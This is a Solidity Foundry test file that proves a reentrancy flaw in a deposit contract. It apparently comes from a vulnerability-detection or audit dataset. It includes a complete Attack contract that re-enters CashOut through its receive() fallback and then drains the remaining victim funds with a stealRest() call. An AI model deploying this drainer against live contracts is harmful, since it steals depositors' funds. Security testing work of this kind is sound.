// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";

contract ReentrancyTest is Test {
    PrivateDeposit private depositContract;
    address victim = makeAddr("victim");
    Attack private attacker;
    uint256 private constant VICTIM_DEPOSIT = 10 ether;
    uint256 private constant ATTACKER_DEPOSIT = 1 ether;

    function setUp() public {
        depositContract = new PrivateDeposit();
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        depositContract.Deposit{value: VICTIM_DEPOSIT}();
        vm.deal(address(this), ATTACKER_DEPOSIT);
        attacker = new Attack{value: ATTACKER_DEPOSIT}(depositContract);
    }

    function test_reentrancy() public {
        uint256 initialContractBalance = address(depositContract).balance;
        assertEq(initialContractBalance, VICTIM_DEPOSIT + ATTACKER_DEPOSIT);
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 depositBalanceBefore = address(depositContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerInternalBefore = depositContract.balances(address(attacker));
        console.log("Contract ETH balance: %s", depositBalanceBefore);
        console.log("Attacker ETH balance: %s", attackerBalanceBefore);
        console.log("Attacker internal token balance: %s", attackerInternalBefore);

        console.log("--- Trigger Attack ---");
        attacker.attack();
        console.log("Attacker executed attack()");

        console.log("--- AFTER-Trigger State ---");
        uint256 depositBalanceAfter = address(depositContract).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerInternalAfter = depositContract.balances(address(attacker));
        console.log("Contract ETH balance: %s", depositBalanceAfter);
        console.log("Attacker ETH balance: %s", attackerBalanceAfter);
        console.log("Attacker internal token balance: %s", attackerInternalAfter);

        uint256 contractBalanceDiff = depositBalanceBefore - depositBalanceAfter;
        uint256 attackerBalanceDiff = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Contract balance change: %s", contractBalanceDiff);
        console.log("Attacker balance gain: %s", attackerBalanceDiff);
        
        assertEq(address(attacker).balance, 2 ether);
        attacker.stealRest();
        assertEq(address(depositContract).balance, 0);
        assertEq(address(attacker).balance, 11 ether);

        // Final verdict based on reentrancy indicators
        bool reentrancyDetected = contractBalanceDiff == 2 ether && 
                                  attackerBalanceDiff == 2 ether && 
                                  attackerInternalAfter == 0;
        console.log(reentrancyDetected ? 
            "Vulnerability Exists: Reentrancy attack succeeded (attacker gained extra ETH)" : 
            "Vulnerability not Exist: Reentrancy state changes not detected");
    }
}

contract Attack {
    PrivateDeposit private depositContract;
    uint256 private reentryCount;
    uint256 private constant MAX_REENTRY = 1;
    uint256 public stolen;
    uint256 private amountDeposited;

    constructor(PrivateDeposit _depositContract) payable {
        depositContract = _depositContract;
        amountDeposited = msg.value;
        depositContract.Deposit{value: msg.value}();
    }

    function attack() public {
        depositContract.CashOut(amountDeposited);
    }

    receive() external payable {
        stolen += msg.value;
        if (reentryCount < MAX_REENTRY) {
            reentryCount++;
            depositContract.CashOut(amountDeposited);
        }
    }

    function stealRest() public {
        uint256 remainingBalance = address(depositContract).balance;
        depositContract.CashOut(remainingBalance);
    }
}